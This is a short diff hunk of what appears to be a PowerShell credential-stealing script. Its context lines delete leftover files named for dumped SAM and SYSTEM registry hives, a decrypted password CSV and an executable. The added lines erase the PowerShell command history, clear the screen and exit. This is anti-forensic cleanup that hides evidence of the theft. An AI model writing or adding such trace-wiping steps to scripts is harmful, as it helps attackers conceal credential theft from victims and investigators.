@@ -34,3 +34,6 @@ rm "$env:TMP\decrypted_password.csv" -r -Force -ErrorAction SilentlyContinue
 rm "$env:TMP\d2.1.exe" -r -Force -ErrorAction SilentlyContinue
 rm "$env:TMP\sam.save" -r -Force -ErrorAction SilentlyContinue
 rm "$env:TMP\system.save" -r -Force -ErrorAction SilentlyContinue
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+cls
+exit
